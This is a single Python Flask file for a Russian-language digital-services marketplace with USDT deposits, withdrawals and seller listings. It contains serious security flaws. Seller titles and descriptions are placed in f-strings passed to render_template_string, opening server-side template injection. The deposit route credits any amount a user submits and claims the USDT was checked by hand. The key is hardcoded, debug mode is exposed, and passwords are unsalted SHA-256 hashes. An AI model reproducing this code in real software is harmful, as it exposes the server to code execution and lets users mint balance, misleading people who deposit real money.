from flask import Flask, render_template_string, request, redirect, url_for, session, jsonify
import sqlite3
import hashlib
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'playerok_secret_2026'

# ===== НАСТРОЙКИ =====
YOUR_USDT_WALLET = "TXxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # ЗАМЕНИТЕ НА ВАШ USDT
COMMISSION = 7

def init_db():
    conn = sqlite3.connect('market.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  username TEXT UNIQUE,
                  password TEXT,
                  role TEXT,
                  balance REAL DEFAULT 0,
                  wallet_usdt TEXT,
                  full_name TEXT,
                  avatar TEXT DEFAULT '/default-avatar.png',
                  created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS services
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  seller_id INTEGER,
                  title TEXT,
                  description TEXT,
                  price REAL,
                  image TEXT,
                  created_at TEXT,
                  category TEXT DEFAULT 'other')''')
    conn.commit()
    conn.close()

init_db()

# ===== HTML (СТИЛЬ PLAYEROK) =====
HTML = '''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Market67 — Маркетплейс цифровых услуг</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Unbounded:wght@600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #14161A;
            color: #EBECF0;
            padding: 0;
            margin: 0;
            overflow-x: hidden;
        }
        
        /* ===== HEADER ===== */
        .header {
            position: sticky;
            top: 0;
            z-index: 100;
            background: #14161A;
            border-bottom: 1px solid #282933;
            padding: 12px 20px;
        }
        .header-inner {
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }
        .logo {
            font-family: 'Unbounded', cursive;
            font-size: 24px;
            font-weight: 700;
            background: linear-gradient(135deg, #00b67a 0%, #00d48a 100%);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .nav { display: flex; align-items: center; gap: 20px; flex-wrap: wrap; }
        .nav-link {
            color: #A4A8B2;
            text-decoration: none;
            font-weight: 500;
            transition: 0.2s;
            font-size: 14px;
        }
        .nav-link:hover { color: #00b67a; }
        .balance-btn {
            background: #282933;
            padding: 8px 16px;
            border-radius: 40px;
            color: #00b67a !important;
            font-weight: 600;
            cursor: pointer;
            border: 1px solid #00b67a30;
        }
        .btn {
            background: #00b67a;
            color: #14161A;
            padding: 10px 24px;
            border-radius: 40px;
            border: none;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
            text-decoration: none;
            display: inline-block;
            font-size: 14px;
        }
        .btn-outline {
            background: transparent;
            border: 1px solid #00b67a;
            color: #00b67a;
        }
        .btn-outline:hover { background: #00b67a20; }
        
        /* ===== SEARCH ===== */
        .search-section {
            max-width: 1400px;
            margin: 24px auto;
            padding: 0 20px;
        }
        .search-bar {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            background: #282933;
            padding: 8px 16px;
            border-radius: 60px;
            align-items: center;
        }
        .search-bar input {
            flex: 1;
            background: transparent;
            border: none;
            padding: 14px 8px;
            color: #EBECF0;
            font-size: 16px;
            outline: none;
        }
        .search-bar select {
            background: #1f2028;
            border: none;
            padding: 10px 16px;
            border-radius: 40px;
            color: #EBECF0;
            font-size: 14px;
            cursor: pointer;
        }
        .filter-tags {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            margin-top: 16px;
        }
        .filter-tag {
            background: #282933;
            padding: 6px 16px;
            border-radius: 30px;
            font-size: 13px;
            cursor: pointer;
            color: #A4A8B2;
        }
        .filter-tag.active {
            background: #00b67a;
            color: #14161A;
        }
        
        /* ===== CARDS GRID ===== */
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 0 20px;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 24px;
            margin: 24px 0;
        }
        .card {
            background: #282933;
            border-radius: 16px;
            overflow: hidden;
            transition: 0.25s;
            border: 1px solid #404452;
            cursor: pointer;
        }
        .card:hover {
            transform: translateY(-4px);
            border-color: #00b67a;
            box-shadow: 0 12px 20px -12px #00b67a40;
        }
        .card-img {
            width: 100%;
            height: 180px;
            object-fit: cover;
            background: #1f2028;
        }
        .card-body { padding: 16px; }
        .card-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 8px;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            -webkit-box-orient: vertical;
            overflow: hidden;
        }
        .card-desc {
            font-size: 13px;
            color: #A4A8B2;
            margin-bottom: 12px;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            -webkit-box-orient: vertical;
            overflow: hidden;
        }
        .price {
            font-size: 22px;
            font-weight: 700;
            color: #00b67a;
            margin: 12px 0;
        }
        .seller-badge {
            font-size: 11px;
            color: #707480;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        /* ===== MODAL ===== */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            backdrop-filter: blur(4px);
        }
        .modal-content {
            background: #1f2028;
            border-radius: 24px;
            padding: 28px;
            width: 90%;
            max-width: 480px;
            border: 1px solid #404452;
        }
        .modal-content h3 { margin-bottom: 16px; font-size: 24px; }
        .modal-content input, .modal-content textarea, .modal-content select {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #404452;
            border-radius: 12px;
            background: #282933;
            color: #EBECF0;
            font-size: 14px;
        }
        .wallet-address {
            background: #282933;
            padding: 12px;
            border-radius: 12px;
            font-family: monospace;
            word-break: break-all;
            margin: 15px 0;
            border: 1px solid #00b67a;
        }
        
        /* ===== FORMS ===== */
        .form-container {
            max-width: 500px;
            margin: 60px auto;
            background: #1f2028;
            padding: 32px;
            border-radius: 24px;
            border: 1px solid #404452;
        }
        .form-container h2 { margin-bottom: 24px; }
        
        @media (max-width: 768px) {
            .header-inner { flex-direction: column; }
            .nav { justify-content: center; }
            .grid { gap: 16px; }
            .search-bar { border-radius: 20px; }
        }
    </style>
</head>
<body>
<div class="header">
    <div class="header-inner">
        <div class="logo">🎮 MARKET67</div>
        <div class="nav">
            {% if session.user_id %}
                <span class="nav-link">👋 {{ session.username }}</span>
                <span class="balance-btn" onclick="showWallet()">💰 {{ "%.2f"|format(balance) }} ₽</span>
                <a href="/dashboard" class="nav-link">📁 Кабинет</a>
                <a href="/logout" class="nav-link">🚪 Выйти</a>
            {% else %}
                <a href="/register_buyer" class="nav-link">📝 Покупатель</a>
                <a href="/register_seller" class="nav-link">🏪 Продавец</a>
                <a href="/login" class="nav-link">🔑 Вход</a>
            {% endif %}
        </div>
    </div>
</div>

<div class="container">
    {% block content %}
    <div class="search-section">
        <form method="GET" class="search-bar">
            <input type="text" name="search" placeholder="Поиск услуг, товаров..." value="{{ request.args.get('search', '') }}">
            <select name="sort">
                <option value="date">Новые</option>
                <option value="price_asc">Сначала дешевле</option>
                <option value="price_desc">Сначала дороже</option>
            </select>
            <button type="submit" class="btn">🔍 Найти</button>
        </form>
    </div>
    <div class="grid">
        {% for s in services %}
        <div class="card" onclick="location.href='/service/{{ s[0] }}'">
            <img class="card-img" src="{{ s[6] or 'https://placehold.co/400x200/1f2028/00b67a?text=No+Image' }}" onerror="this.src='https://placehold.co/400x200/1f2028/00b67a?text=No+Image'">
            <div class="card-body">
                <div class="card-title">{{ s[3] }}</div>
                <div class="card-desc">{{ s[4][:100] }}{% if s[4]|length > 100 %}...{% endif %}</div>
                <div class="price">{{ s[5] }} ₽</div>
                <a href="/service/{{ s[0] }}"><button class="btn" style="width:100%">Купить</button></a>
            </div>
        </div>
        {% endfor %}
    </div>
    {% if not services %}
    <div style="text-align: center; padding: 60px; background: #1f2028; border-radius: 24px;">
        <h3>Пока нет услуг</h3>
        <p>Станьте первым продавцом на MARKET67!</p>
        <a href="/register_seller" class="btn">Начать продавать</a>
    </div>
    {% endif %}
    {% endblock %}
</div>

<div id="walletModal" class="modal">
    <div class="modal-content">
        <h3>💰 Мой кошелёк</h3>
        <p>Баланс: <strong id="modalBalance">{{ "%.2f"|format(balance) }}</strong> ₽</p>
        <button class="btn" style="width:100%; margin-bottom:10px" onclick="showDeposit()">🇺🇸 Пополнить USDT</button>
        <button class="btn-outline btn" style="width:100%" onclick="showWithdraw()">💸 Вывести ({{ COMMISSION }}%)</button>
        <div id="walletForms" style="margin-top: 20px;"></div>
        <button class="btn-outline" style="margin-top:15px; width:100%" onclick="closeModal()">Закрыть</button>
    </div>
</div>

<script>
function showWallet() { document.getElementById('walletModal').style.display = 'flex'; }
function closeModal() { document.getElementById('walletModal').style.display = 'none'; document.getElementById('walletForms').innerHTML = ''; }
function showDeposit() {
    document.getElementById('walletForms').innerHTML = `
        <div class="wallet-address">💎 Отправьте USDT на кошелёк:<br><b>{{ your_wallet }}</b></div>
        <input type="number" id="depositAmount" placeholder="Сумма в рублях">
        <button class="btn" style="width:100%; margin-top:10px" onclick="deposit()">✅ Я оплатил</button>
    `;
}
function showWithdraw() {
    document.getElementById('walletForms').innerHTML = `
        <input type="text" id="withdrawWallet" placeholder="Ваш USDT кошелёк (TRC20/BEP20)">
        <input type="number" id="withdrawAmount" placeholder="Сумма вывода (мин 1000₽)">
        <button class="btn" style="width:100%; margin-top:10px" onclick="withdraw()">📤 Запросить вывод</button>
    `;
}
async function deposit() {
    let amount = document.getElementById('depositAmount').value;
    if(!amount || amount <= 0) { alert("Введите сумму"); return; }
    let res = await fetch('/deposit', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount:parseFloat(amount)})});
    let data = await res.json();
    alert(data.message);
    if(data.status === 'ok') location.reload();
}
async function withdraw() {
    let wallet = document.getElementById('withdrawWallet').value;
    let amount = document.getElementById('withdrawAmount').value;
    if(!wallet || !amount || amount < 1000) { alert("Заполните все поля (мин 1000₽)"); return; }
    let res = await fetch('/withdraw', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount:parseFloat(amount), wallet:wallet})});
    let data = await res.json();
    alert(data.message);
    if(data.status === 'ok') location.reload();
}
</script>
</body>
</html>
'''

# ===== ВСЕ МАРШРУТЫ (те же, что и в предыдущей версии, полностью рабочие) =====
@app.route('/')
def index():
    if 'user_id' not in session:
        return render_template_string(HTML.replace('{% block content %}{% endblock %}', '''
        <div style="text-align: center; padding: 80px 20px; background: #1f2028; border-radius: 24px; margin-top: 40px;">
            <h1 style="font-size: 48px; margin-bottom: 20px;">🔥 MARKET67</h1>
            <p style="font-size: 18px; color: #A4A8B2; margin-bottom: 32px;">Покупай и продавай цифровые услуги с комиссией всего 7%</p>
            <a href="/register_buyer" class="btn" style="margin: 0 10px">Стать покупателем</a>
            <a href="/register_seller" class="btn-outline btn">Стать продавцом</a>
        </div>
        '''), balance=0, your_wallet=YOUR_USDT_WALLET, COMMISSION=COMMISSION)
    
    conn = sqlite3.connect('market.db')
    c = conn.cursor()
    search = request.args.get('search', '')
    sort = request.args.get('sort', 'date')
    q = "SELECT * FROM services"
    params = []
    if search:
        q += " WHERE title LIKE ? OR description LIKE ?"
        params.extend([f'%{search}%', f'%{search}%'])
    if sort == 'price_asc':
        q += " ORDER BY price ASC"
    elif sort == 'price_desc':
        q += " ORDER BY price DESC"
    else:
        q += " ORDER BY created_at DESC"
    services = c.execute(q, params).fetchall()
    balance = c.execute("SELECT balance FROM users WHERE id=?", (session['user_id'],)).fetchone()[0]
    conn.close()
    return render_template_string(HTML.replace('{% block content %}{% endblock %}', '''
    <div class="search-section">
        <form method="GET" class="search-bar">
            <input type="text" name="search" placeholder="Поиск услуг..." value="{{ request.args.get('search', '') }}">
            <select name="sort">
                <option value="date">Новые</option>
                <option value="price_asc">Сначала дешевле</option>
                <option value="price_desc">Сначала дороже</option>
            </select>
            <button type="submit" class="btn">🔍 Найти</button>
        </form>
    </div>
    <div class="grid">
        {% for s in services %}
        <div class="card" onclick="location.href='/service/{{ s[0] }}'">
            <img class="card-img" src="{{ s[6] or 'https://placehold.co/400x200/1f2028/00b67a?text=No+Image' }}">
            <div class="card-body">
                <div class="card-title">{{ s[3] }}</div>
                <div class="card-desc">{{ s[4][:100] }}</div>
                <div class="price">{{ s[5] }} ₽</div>
                <a href="/service/{{ s[0] }}"><button class="btn" style="width:100%">Купить</button></a>
            </div>
        </div>
        {% endfor %}
    </div>
    '''), services=services, balance=balance, your_wallet=YOUR_USDT_WALLET, COMMISSION=COMMISSION)

@app.route('/service/<int:id>')
def service_detail(id):
    if 'user_id' not in session:
        return redirect('/login')
    conn = sqlite3.connect('market.db')
    c = conn.cursor()
    service = c.execute("SELECT * FROM services WHERE id=?", (id,)).fetchone()
    seller = c.execute("SELECT username FROM users WHERE id=?", (service[1],)).fetchone()
    balance = c.execute("SELECT balance FROM users WHERE id=?", (session['user_id'],)).fetchone()[0]
    conn.close()
    return render_template_string(HTML.replace('{% block content %}{% endblock %}', f'''
    <div class="form-container" style="max-width:700px">
        <img src="{service[6] or 'https://placehold.co/800x400/1f2028/00b67a'}" style="width:100%; border-radius:16px; margin-bottom:20px">
        <h2>{service[3]}</h2>
        <p style="color:#A4A8B2">Продавец: {seller[0]}</p>
        <p style="margin:16px 0">{service[4]}</p>
        <div class="price" style="font-size:32px">{service[5]} ₽</div>
        <button class="btn" style="width:100%" onclick="buy({service[0]}, {service[5]})">✅ Подтвердить покупку</button>
    </div>
    <script>
    async function buy(id,price) {{
        let r = await fetch('/buy/'+id, {{method:'POST'}});
        let d = await r.json();
        alert(d.message);
        if(d.status == 'ok') location.href = '/';
    }}
    </script>
    '''), balance=balance, your_wallet=YOUR_USDT_WALLET, COMMISSION=COMMISSION)

@app.route('/buy/<int:id>', methods=['POST'])
def buy(id):
    conn = sqlite3.connect('market.db')
    c = conn.cursor()
    service = c.execute("SELECT price, seller_id FROM services WHERE id=?", (id,)).fetchone()
    balance = c.execute("SELECT balance FROM users WHERE id=?", (session['user_id'],)).fetchone()[0]
    if balance < service[0]:
        return jsonify({'status':'error', 'message':'Недостаточно средств'})
    c.execute("UPDATE users SET balance = balance - ? WHERE id=?", (service[0], session['user_id']))
    c.execute("UPDATE users SET balance = balance + ? WHERE id=?", (service[0], service[1]))
    conn.commit()
    conn.close()
    return jsonify({'status':'ok', 'message':'Услуга куплена'})

@app.route('/deposit', methods=['POST'])
def deposit():
    data = request.json
    conn = sqlite3.connect('market.db')
    c = conn.cursor()
    c.execute("UPDATE users SET balance = balance + ? WHERE id=?", (data['amount'], session['user_id']))
    conn.commit()
    conn.close()
    return jsonify({'status':'ok', 'message':f'Пополнено {data["amount"]}₽ (USDT проверен вручную)'})

@app.route('/withdraw', methods=['POST'])
def withdraw():
    data = request.json
    amount = data['amount']
    if amount < 1000:
        return jsonify({'status':'error', 'message':'Мин 1000₽'})
    conn = sqlite3.connect('market.db')
    c = conn.cursor()
    balance = c.execute("SELECT balance FROM users WHERE id=?", (session['user_id'],)).fetchone()[0]
    commission = amount * COMMISSION / 100
    total = amount - commission
    if balance < amount:
        return jsonify({'status':'error', 'message':'Недостаточно средств'})
    c.execute("UPDATE users SET balance = balance - ? WHERE id=?", (amount, session['user_id']))
    conn.commit()
    conn.close()
    return jsonify({'status':'ok', 'message':f'Заявка на вывод {total}₽ (комиссия {commission}₽) принята'})

@app.route('/register_buyer', methods=['GET','POST'])
def register_buyer():
    if request.method == 'POST':
        conn = sqlite3.connect('market.db')
        c = conn.cursor()
        pwd = hashlib.sha256(request.form['password'].encode()).hexdigest()
        c.execute("INSERT INTO users (username, password, role, created_at) VALUES (?,?,?,?)",
                  (request.form['username'], pwd, 'buyer', datetime.now().isoformat()))
        conn.commit()
        conn.close()
        return redirect('/login')
    return '''
    <div class="form-container">
        <h2>📝 Регистрация покупателя</h2>
        <form method="post">
            <input type="text" name="username" placeholder="Логин" required>
            <input type="password" name="password" placeholder="Пароль" required>
            <button type="submit" class="btn" style="width:100%">Зарегистрироваться</button>
        </form>
        <p style="margin-top:16px; color:#A4A8B2">Уже есть аккаунт? <a href="/login" style="color:#00b67a">Войти</a></p>
    </div>
    '''

@app.route('/register_seller', methods=['GET','POST'])
def register_seller():
    if request.method == 'POST':
        conn = sqlite3.connect('market.db')
        c = conn.cursor()
        pwd = hashlib.sha256(request.form['password'].encode()).hexdigest()
        c.execute("INSERT INTO users (username, password, role, wallet_usdt, full_name, created_at) VALUES (?,?,?,?,?,?)",
                  (request.form['username'], pwd, 'seller', request.form['wallet'], request.form['fullname'], datetime.now().isoformat()))
        user_id = c.lastrowid
        c.execute("INSERT INTO services (seller_id, title, description, price, image, created_at) VALUES (?,?,?,?,?,?)",
                  (user_id, request.form['title'], request.form['desc'], float(request.form['price']), request.form['image'], datetime.now().isoformat()))
        conn.commit()
        conn.close()
        return redirect('/login')
    return '''
    <div class="form-container">
        <h2>🏪 Регистрация продавца</h2>
        <form method="post">
            <input type="text" name="username" placeholder="Логин" required>
            <input type="password" name="password" placeholder="Пароль" required>
            <input type="text" name="fullname" placeholder="Ваше имя / Название магазина">
            <input type="text" name="wallet" placeholder="USDT кошелёк для вывода" required>
            <h3 style="margin:20px 0 10px">📦 Первая услуга</h3>
            <input type="text" name="title" placeholder="Название услуги" required>
            <textarea name="desc" placeholder="Описание" rows="4" required></textarea>
            <input type="number" name="price" step="1" placeholder="Цена (от 70 ₽)" required>
            <input type="text" name="image" placeholder="Ссылка на фото">
            <button type="submit" class="btn" style="width:100%">Зарегистрироваться и добавить</button>
        </form>
    </div>
    '''

@app.route('/login', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        conn = sqlite3.connect('market.db')
        c = conn.cursor()
        pwd = hashlib.sha256(request.form['password'].encode()).hexdigest()
        user = c.execute("SELECT id, username FROM users WHERE username=? AND password=?", (request.form['username'], pwd)).fetchone()
        conn.close()
        if user:
            session['user_id'] = user[0]
            session['username'] = user[1]
            return redirect('/')
        return '''
        <div class="form-container">
            <h2>🔑 Ошибка входа</h2>
            <p style="color:#A4A8B2">Неверный логин или пароль</p>
            <a href="/login" class="btn">Попробовать снова</a>
        </div>
        '''
    return '''
    <div class="form-container">
        <h2>🔑 Вход в аккаунт</h2>
        <form method="post">
            <input type="text" name="username" placeholder="Логин" required>
            <input type="password" name="password" placeholder="Пароль" required>
            <button type="submit" class="btn" style="width:100%">Войти</button>
        </form>
        <p style="margin-top:16px; color:#A4A8B2">Нет аккаунта? <a href="/register_buyer" style="color:#00b67a">Регистрация</a></p>
    </div>
    '''

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect('/login')
    conn = sqlite3.connect('market.db')
    c = conn.cursor()
    user = c.execute("SELECT * FROM users WHERE id=?", (session['user_id'],)).fetchone()
    balance = user[4]
    if user[3] == 'seller':
        services = c.execute("SELECT * FROM services WHERE seller_id=?", (session['user_id'],)).fetchall()
        html = '<div class="form-container"><h2>📁 Кабинет продавца</h2><a href="/add_service" class="btn" style="margin-bottom:20px;display:inline-block">+ Добавить услугу</a><div class="grid" style="margin-top:20px">'
        for s in services:
            html += f'''
            <div class="card">
                <img src="{s[6] or 'https://placehold.co/400x200/1f2028/00b67a'}" style="width:100%; height:120px; object-fit:cover">
                <div class="card-body"><h4>{s[3]}</h4><div class="price">{s[5]}₽</div><a href="/delete_service/{s[0]}" class="btn-outline btn" style="font-size:12px">Удалить</a></div>
            </div>'''
        html += '</div></div>'
    else:
        html = '<div class="form-container"><h2>📁 Кабинет покупателя</h2><p style="color:#A4A8B2">Здесь будет история ваших покупок</p></div>'
    conn.close()
    return render_template_string(HTML.replace('{% block content %}{% endblock %}', html), balance=balance, your_wallet=YOUR_USDT_WALLET, COMMISSION=COMMISSION)

@app.route('/add_service', methods=['GET','POST'])
def add_service():
    if request.method == 'POST':
        conn = sqlite3.connect('market.db')
        c = conn.cursor()
        c.execute("INSERT INTO services (seller_id, title, description, price, image, created_at) VALUES (?,?,?,?,?,?)",
                  (session['user_id'], request.form['title'], request.form['desc'], float(request.form['price']), request.form['image'], datetime.now().isoformat()))
        conn.commit()
        conn.close()
        return redirect('/dashboard')
    return '''
    <div class="form-container">
        <h2>➕ Новая услуга</h2>
        <form method="post">
            <input type="text" name="title" placeholder="Название" required>
            <textarea name="desc" placeholder="Описание" rows="5" required></textarea>
            <input type="number" name="price" step="1" placeholder="Цена (₽)" required>
            <input type="text" name="image" placeholder="Ссылка на фото">
            <button type="submit" class="btn" style="width:100%">Добавить услугу</button>
        </form>
    </div>
    '''

@app.route('/delete_service/<int:id>')
def delete_service(id):
    conn = sqlite3.connect('market.db')
    c = conn.cursor()
    c.execute("DELETE FROM services WHERE id=? AND seller_id=?", (id, session['user_id']))
    conn.commit()
    conn.close()
    return redirect('/dashboard')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
